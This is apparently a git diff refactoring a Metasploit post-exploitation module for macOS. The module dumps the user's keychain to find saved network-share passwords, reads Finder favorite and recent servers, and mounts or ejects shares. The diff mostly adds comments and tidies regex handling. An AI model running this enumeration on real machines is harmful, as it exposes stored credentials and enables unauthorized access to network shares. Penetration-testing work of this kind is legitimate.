@@ -10,6 +10,8 @@ class Metasploit3 < Msf::Post
 
   FILE_SHARE_PROTOCOLS = %w(smb nfs cifs ftp afp)
 
+  NAME_REGEXES = [/^Name \= \"(.*)\"\;$/, /^Name \= (.*)\;$/]
+
   include Msf::Post::File
 
   def initialize(info={})
@@ -50,8 +52,6 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    fail_with("Invalid action") if action.nil?
-
     username = cmd_exec('whoami').strip
     security_path = datastore['SECURITY_PATH']
     sidebar_plist_path = datastore['SIDEBAR_PLIST_PATH'].gsub(/^\~/, "/Users/#{username}")
@@ -114,18 +114,19 @@ class Metasploit3 < Msf::Post
     end
   end
 
+  # Returns the network shares stored in the user's keychain. These shares will often have
+  # creds attached, so mounting occurs without prompting the user for a password.
+  # @return [Array<String>] sorted list of volumes stored in the user's keychain
   def get_keyring_shares(security_path)
-    data = cmd_exec("#{security_path.shellescape} dump")
-
     # Grep for desc srvr and ptcl
+    data = cmd_exec("#{security_path.shellescape} dump")
     lines = data.lines.select { |line| line =~ /desc|srvr|ptcl/ }.map(&:strip)
 
     # Go through the list, find the saved Network Password descriptions
     # and their corresponding ptcl and srvr attributes
     list = []
-    # for x in 0..lines.length-1
     lines.each_with_index do |line, x|
-      if line =~ /"desc"<blob>="Network Password"/ && x < lines.length-3
+      if line =~ /"desc"<blob>="Network Password"/ && x < lines.length-2
         # Remove everything up to the double-quote after the equal sign,
         # and also the trailing double-quote
         if lines[x+1].match "^.*\=\"(.*)\w*\"\w*$"
@@ -140,42 +141,42 @@ class Metasploit3 < Msf::Post
     list.sort
   end
 
+  # Returns the user's "Favorite Shares". To add a Favorite Share on OSX, press cmd-k in Finder, enter
+  # an address, then click the [+] button next to the address field.
+  # @return [Array<String>] sorted list of volumes saved in the user's "Recent Shares"
   def get_favorite_shares(sidebar_plist_path)
-    data = cmd_exec("defaults read #{sidebar_plist_path.shellescape} favoriteservers")
-
     # Grep for URL
+    data = cmd_exec("defaults read #{sidebar_plist_path.shellescape} favoriteservers")
     list = data.lines.map(&:strip).map { |line| line =~ /^URL = \"(.*)\"\;$/; $1 }.compact
-    data = cmd_exec("defaults read #{sidebar_plist_path.shellescape} favorites")
 
     # Grep for EntryType and Name
+    data = cmd_exec("defaults read #{sidebar_plist_path.shellescape} favorites")
     lines = data.lines.map(&:strip).select { |line| line =~ /EntryType|Name/ }
+
     # Go through the list, find the rows with EntryType 8 and their
     # corresponding name
-    for x in 0..lines.length-1
-      if lines[x] =~ /EntryType = 8;/ && x < lines.length-2
-        if lines[x+1] =~ /^Name \= \"(.*)\"\;$/
-          name = $1
-          list.push(name) unless list.include?(name)
-        elsif lines[x+1] =~ /^Name \= (.*)\;$/
-          name = $1
-          list.push(name) unless list.include?(name)
+    lines.each_with_index do |line, x|
+      if line =~ /EntryType = 8;/ && x < lines.length-1
+        if NAME_REGEXES.any? { |r| lines[x+1].strip =~ r }
+          list.push($1)
         end
       end
     end
 
-    return list.sort
+    list.sort
   end
 
+  # Returns the user's "Recent Shares" list
+  # @return [Array<String>] sorted list of volumes saved in the user's "Recent Shares"
   def get_recent_shares(recent_plist_path)
-    data = cmd_exec("defaults read #{recent_plist_path.shellescape} RecentServers")
     # Grep for Name
-    regexes = [ /^Name = \"(.*)\"\;$/, /^Name = (.*)\;$/ ]
-    data.lines.select{ |line| if regexes.any? { |r| line.strip! =~ r } then $1 end }.compact.uniq.map(&:strip)
+    data = cmd_exec("defaults read #{recent_plist_path.shellescape} RecentServers")
+    data.lines.map(&:strip).select { |line| if NAME_REGEXES.any? { |r| line.strip =~ r } then $1 end }.compact.uniq.sort
   end
 
+  # @return [Array<String>] sorted list of mounted volume names
   def get_mounted_volumes
-    data = cmd_exec("ls /Volumes")
-    data.lines.map(&:strip).sort
+    cmd_exec("ls /Volumes").lines.map(&:strip).sort
   end
 
   def mount
@@ -191,6 +192,7 @@ class Metasploit3 < Msf::Post
     cmd_exec("#{osascript_path.shellescape} -e 'tell app \"finder\" to eject \"#{share_name}\"'")
   end
 
+  # hook cmd_exec to print a debug message when DEBUG=true
   def cmd_exec(cmd)
     vprint_status(cmd)
     super
